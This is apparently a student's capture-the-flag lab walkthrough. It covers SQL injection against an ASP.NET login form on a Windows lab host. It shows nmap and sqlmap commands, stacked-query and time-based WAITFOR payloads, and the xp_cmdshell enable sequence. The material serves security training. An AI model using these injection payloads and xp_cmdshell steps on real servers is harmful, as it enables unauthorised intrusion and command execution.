# Walk: SQL Injections Attacks - Module Exercise - VM 7

## Fecha: 29/01/2025
## Host: Windows
## IP: 192.168.197.50

---

## Objetivo
Capstone Lab: Enumerate the Module Exercise - VM #4 and exploit the SQLi vulnerability to get the flag.

---
## Herramientas
1. sqlmap
2. burp
3. impacket-mssqlclient
---
## Procedimiento y comandos
1. Paso 1: Enumeramos el host
```
nmap -sV --open 192.168.197.50

Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-29 10:03 -03
Nmap scan report for 192.168.197.50
Host is up (0.19s latency).
Not shown: 962 closed tcp ports (reset), 33 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.83 seconds

```
Encontramos un Servidor Windows, y una pagina web en el puerto 80. Navegando en ella encontramos un formulario de login a testear:
Header:

```
POST /login.aspx HTTP/1.1
Host: 192.168.197.50
Content-Length: 443
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.197.50
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.197.50/login.aspx
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox=duckman&ctl00%24ContentPlaceHolder1%24PasswordTextBox=test123&ctl00%24ContentPlaceHolder1%24LoginButton=Login

```
Comando **sqlmap** para revisar los parametros:
```
 sqlmap -u "http://192.168.197.50/login.aspx" --method=POST \
--data="__VIEWSTATE=%2FwEPDwUKMjA3MTgxMTM4N2Rkqwqg%2FoL5YGI9DrkSto9XLwBOyfqn9AahjRMC9ISiuB4%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEdAAS%2FuzRgA9bOZgZWuL94SJbKG8sL8VA5%2Fm7gZ949JdB2tEE%2BRwHRw9AX2%2FIZO4gVaaKVeG6rrLts0M7XT7lmdcb6wkDVQ%2BfPh1lhuA2bqiJXDjQ9KzSeE6SutA98NNH%2BM50%3D&ctl00%24ContentPlaceHolder1%24UsernameTextBox=duckman&ctl00%24ContentPlaceHolder1%24PasswordTextBox=test123&ctl00%24ContentPlaceHolder1%24LoginButton=Login" \
-p "ctl00\$ContentPlaceHolder1\$UsernameTextBox,ctl00\$ContentPlaceHolder1\$PasswordTextBox" \
--headers="Cache-Control: max-age=0; Accept-Language: en-US,en;q=0.9; Origin: http://192.168.197.50; Content-Type: application/x-www-form-urlencoded; Upgrade-Insecure-Requests: 1; User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.6778.86 Safari/537.36; Referer: http://192.168.197.50/login.aspx; Accept-Encoding: gzip, deflate, br; Connection: keep-alive" \
--level=5 --risk=3 --batch

```
Encontramos del comando **sqlmap** lo siguiente:
```
POST parameter 'ctl00$ContentPlaceHolder1$UsernameTextBox' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 1154 HTTP(s) requests:
---
Parameter: ctl00$ContentPlaceHolder1$UsernameTextBox (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: __VIEWSTATE=/wEPDwUKMjA3MTgxMTM4Nw9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUmSW52YWxpZCBjcmVkZW50aWFscy4gUGxlYXNlIHRyeSBhZ2Fpbi5kZGQBPTdMqS5Ul3SMNtGtg/P/yY/9wvvPLFKzxx1KQ5PYkQ==&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=/wEdAAQA5q3sooTDd3D4bXwYKaPSG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6SyIHr1g9J2ichD+sXBOsOsW4EtI0XDMY3uBxZiCrp80=&ctl00$ContentPlaceHolder1$UsernameTextBox=duckman';WAITFOR DELAY '0:0:5'--&ctl00$ContentPlaceHolder1$PasswordTextBox=test123&ctl00$ContentPlaceHolder1$LoginButton=Login

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: __VIEWSTATE=/wEPDwUKMjA3MTgxMTM4Nw9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUmSW52YWxpZCBjcmVkZW50aWFscy4gUGxlYXNlIHRyeSBhZ2Fpbi5kZGQBPTdMqS5Ul3SMNtGtg/P/yY/9wvvPLFKzxx1KQ5PYkQ==&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=/wEdAAQA5q3sooTDd3D4bXwYKaPSG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6SyIHr1g9J2ichD+sXBOsOsW4EtI0XDMY3uBxZiCrp80=&ctl00$ContentPlaceHolder1$UsernameTextBox=duckman' WAITFOR DELAY '0:0:5'-- OMmo&ctl00$ContentPlaceHolder1$PasswordTextBox=test123&ctl00$ContentPlaceHolder1$LoginButton=Login
---
[10:01:53] [INFO] testing Microsoft SQL Server
[10:01:53] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
[10:01:59] [INFO] confirming Microsoft SQL Server
[10:02:04] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 11 or 2022 or 2016 or 2019 or 10
web application technology: Microsoft IIS 10.0, ASP.NET 4.0.30319, ASP.NET
back-end DBMS: Microsoft SQL Server 2019
[10:02:04] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 1 times

```
Encantramos un parametro vulnerabla a dos tipos de inyecciones, lo cual nos da dos vectores de ataque posibles:
 - Vector de Ataque Inicial (Stacked Queries) → Permite ejecutar múltiples consultas en una sola ejecución.
 - Alternativa en caso de restricciones: Time-Based Blind → Se basa en la demora de respuestas para inferir datos.

2. Paso 2: Enumeracion de la base de datos.
- Bases de datos disponibles
```
sqlmap -u "http://192.168.197.50/login.aspx" --method=POST \
--data="__VIEWSTATE=...&ctl00$ContentPlaceHolder1$UsernameTextBox=duckman*&ctl00$ContentPlaceHolder1$PasswordTextBox=test123&ctl00$ContentPlaceHolder1$LoginButton=Login" \
-p "ctl00$ContentPlaceHolder1$UsernameTextBox" --dbs --batch
```
De este comando obtenemos un par de errores:
```
[12:16:49] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[12:16:49] [CRITICAL] previous heuristics detected that the target is protected by some kind of WAF/IPS
[12:16:49] [INFO] testing if the target URL content is stable
[12:16:49] [INFO] target URL content is stable
[12:16:49] [INFO] testing if (custom) POST parameter '#1*' is dynamic
[12:16:49] [WARNING] (custom) POST parameter '#1*' does not appear to be dynamic
[12:16:50] [WARNING] heuristic (basic) test shows that (custom) POST parameter '#1*' might not be injectable
...

[12:17:09] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[12:17:09] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 89 times
...

```
Parece que el servidor está devolviendo un HTTP 500 (Internal Server Error), lo que puede significar varias cosas:

    1. El WAF/IPS está bloqueando los intentos de inyección SQL.
    2. El payload que se está enviando está generando un error en el backend.
    3. La inyección SQL funciona, pero el servidor tiene una mala configuración y no está devolviendo los errores correctamente.

Procedemos a aumentar la agresividad de la enumeracion:
```
sqlmap -u "http://192.168.197.50/login.aspx" --method=POST \
--data="__VIEWSTATE=...&ctl00$ContentPlaceHolder1$UsernameTextBox=duckman*&ctl00$ContentPlaceHolder1$PasswordTextBox=test123&ctl00$ContentPlaceHolder1$LoginButton=Login" \
-p "ctl00$ContentPlaceHolder1$UsernameTextBox" --dbs --level=5 --risk=3 --batch
```
y fallamos rotundamente.. parece que hay un waf/ips que impide enumerar.. probamos checkear si xp_cmdshell esta disponible:
```
sqlmap -r header-VM7.txt -p ctl00\$ContentPlaceHolder1\$UsernameTextBox --batch --dbms=mssql --sql-shell
...
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: ctl00$ContentPlaceHolder1$UsernameTextBox (POST)
    Type: stacked queries
    Title: Microsoft SQL Server/Sybase stacked queries (comment)
    Payload: __VIEWSTATE=/wEPDwUKMjA3MTgxMTM4Nw9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUmSW52YWxpZCBjcmVkZW50aWFscy4gUGxlYXNlIHRyeSBhZ2Fpbi5kZGQBPTdMqS5Ul3SMNtGtg/P/yY/9wvvPLFKzxx1KQ5PYkQ==&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=/wEdAAQA5q3sooTDd3D4bXwYKaPSG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6SyIHr1g9J2ichD+sXBOsOsW4EtI0XDMY3uBxZiCrp80=&ctl00$ContentPlaceHolder1$UsernameTextBox=duckman';WAITFOR DELAY '0:0:5'--&ctl00$ContentPlaceHolder1$PasswordTextBox=test123&ctl00$ContentPlaceHolder1$LoginButton=Login

    Type: time-based blind
    Title: Microsoft SQL Server/Sybase time-based blind (IF)
    Payload: __VIEWSTATE=/wEPDwUKMjA3MTgxMTM4Nw9kFgJmD2QWAgIDD2QWAgIBD2QWAgIHDw8WAh4EVGV4dAUmSW52YWxpZCBjcmVkZW50aWFscy4gUGxlYXNlIHRyeSBhZ2Fpbi5kZGQBPTdMqS5Ul3SMNtGtg/P/yY/9wvvPLFKzxx1KQ5PYkQ==&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=/wEdAAQA5q3sooTDd3D4bXwYKaPSG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6SyIHr1g9J2ichD+sXBOsOsW4EtI0XDMY3uBxZiCrp80=&ctl00$ContentPlaceHolder1$UsernameTextBox=duckman' WAITFOR DELAY '0:0:5'-- OMmo&ctl00$ContentPlaceHolder1$PasswordTextBox=test123&ctl00$ContentPlaceHolder1$LoginButton=Login
---
[14:18:30] [INFO] testing Microsoft SQL Server
[14:18:30] [INFO] confirming Microsoft SQL Server
[14:18:30] [INFO] the back-end DBMS is Microsoft SQL Server
web server operating system: Windows 11 or 2016 or 2019 or 10 or 2022
web application technology: ASP.NET, Microsoft IIS 10.0, ASP.NET 4.0.30319
back-end DBMS: Microsoft SQL Server 2019
[14:18:30] [INFO] calling Microsoft SQL Server shell. To quit type 'x' or 'q' and press ENTER
sql-shell> 

```
Y obtenemos un shell para activar xp_cmdshell!:
```
'EXECUTE sp_configure 'show advanced options', 1; -- 
'RECONFIGURE; --
'EXECUTE sp_configure 'xp_cmdshell', 1; --
'RECONFIGURE; --
'EXECUTE xp_cmdshell 'whoami'; --

```

---
## Troubleshooting

---
## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripción breve (Comando)
- [ ] **Herramienta 2:** Descripción breve (Comando)
- [ ] **Herramienta 3:** Descripción breve (Comando)

